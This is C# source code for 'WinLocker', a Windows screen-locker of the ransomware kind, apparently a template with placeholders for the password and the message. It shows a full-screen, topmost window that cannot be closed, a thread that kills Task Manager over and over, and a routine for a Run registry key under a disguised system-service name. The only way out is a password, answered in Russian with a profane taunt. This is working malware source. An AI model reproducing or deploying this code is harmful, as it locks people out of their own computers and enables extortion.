using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WinLocker
{
   class LockScreen : Form
   {
      private void InitializeComponent()
      {
         button1 = new Button();
         textBox1 = new TextBox();
         label1 = new Label();
         label2 = new Label();
         SuspendLayout();
         // 
         // label1
         // 
         label1.AutoSize = true;
         label1.Location = new Point( 100, 9 );
         label1.Name = "label1";
         label1.Size = new Size( 85, 13 );
         label1.TabIndex = 2;
         label1.Text = "Winlocker v.666";
         // 
         // textBox1
         // 
         textBox1.Location = new Point( 12, 25 );
         textBox1.Name = "textBox1";
         textBox1.Size = new Size( 260, 23 );
         textBox1.TabIndex = 1;
         // 
         // button1
         // 
         button1.Location = new Point( 12, 51 );
         button1.Name = "button1";
         button1.Size = new Size( 260, 23 );
         button1.TabIndex = 0;
         button1.Text = "Разблокировать";
         button1.UseVisualStyleBackColor = true;
         button1.Click += new EventHandler( TryUnlock );
         // 
         // label2
         // 
         label2.AutoSize = true;
         label2.Location = new Point( 3, 80 );
         label2.Name = "label2";
         label2.Size = new Size( 85, 13 );
         label2.TabIndex = 666;
         label2.MaximumSize = new Size( 500, 0 );
         label2.Text = "lllllable2";
         // 
         // LockScreen
         // 
         AutoScaleDimensions = new SizeF( 6F, 13F );
         AutoScaleMode = AutoScaleMode.Font;
         ClientSize = new Size( 800, 800 );
         Controls.Add( label2 );
         Controls.Add( label1 );
         Controls.Add( textBox1 );
         Controls.Add( button1 );
         FormBorderStyle = FormBorderStyle.None;
         Name = "LockScreen";
         Text = "Form1";
         TopMost = true;
         WindowState = System.Windows.Forms.FormWindowState.Maximized;
         FormClosing += new FormClosingEventHandler( OnClosing );
         ResumeLayout( false );
         PerformLayout();

      }

      private IContainer components = null;
      private Button button1;
      private TextBox textBox1;
      private Label label1;
      private Label label2;

      private const string password = "[_password]";
      private const string description = "[_description]";

      public static void Main( string[] args )
      {
         Application.EnableVisualStyles();
         Application.SetCompatibleTextRenderingDefault( false );
         Application.Run( new LockScreen() );
      }

      public LockScreen()
      {
         InitializeComponent();
         AutoStart( false );
         label2.Text = description;

         int screenWidth = Screen.PrimaryScreen.Bounds.Width;
         int screenHeight = Screen.PrimaryScreen.Bounds.Height;
         label1.Location = new Point( 3 + screenWidth / 2 - label1.Width / 2, screenHeight / 2 - 95 );
         textBox1.Location = new Point( 3 + screenWidth / 2 - textBox1.Width / 2, screenHeight / 2 - 75 );
         button1.Location = new Point( 3 + screenWidth / 2 - button1.Width / 2, screenHeight / 2 - 50 );
         label2.Location = new Point( 3 + screenWidth / 2 - label2.Width / 2, screenHeight / 2 - 20 );



         Thread killTMgr = new Thread( delegate ()
         {
            while ( true )
            {
               try
               {
                  Process[] processes = Process.GetProcessesByName( "Taskmgr" );
                  if ( processes.Length != 0 )
                  {
                     processes[0].Kill();
                  }
               }
               catch { }
               Thread.Sleep( 200 );
            }
         } );
         killTMgr.Start();
      }






      protected override void Dispose( bool disposing )
      {
         if ( disposing && ( components != null ) )
         {
            components.Dispose();
         }
         base.Dispose( disposing );
      }

      private void Unlock()
      {
         Environment.Exit( 0 );
      }

      private void TryUnlock( object sender, EventArgs e )
      {
         if ( textBox1.Text == password )
         {
            Unlock();
         }
         else
         {
            textBox1.Text = "нихуя не тот пароль";
         }
      }

      private void AutoStart( bool flag )
      {
         const string name = "ServiceHub.Host.CLR.x86 (32 бита)";
         string ExePath = Application.ExecutablePath;
         Microsoft.Win32.RegistryKey reg;
         reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey( "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" );
         if ( flag )
         {
            try
            {

               reg.SetValue( name, ExePath );

               reg.Close();

            }
            catch { label1.Text = "dsd"; }
         }
         else
         {
            try
            {
               reg.DeleteValue( name );
               reg.Close();
            }
            catch { }
         }
      }

      private void DebugUnlock( object sender, EventArgs e )
      {
         Unlock();
      }

      private void OnClosing( object sender, FormClosingEventArgs e )
      {
         e.Cancel = true;
         base.OnClosing( e );
      }
   }
}
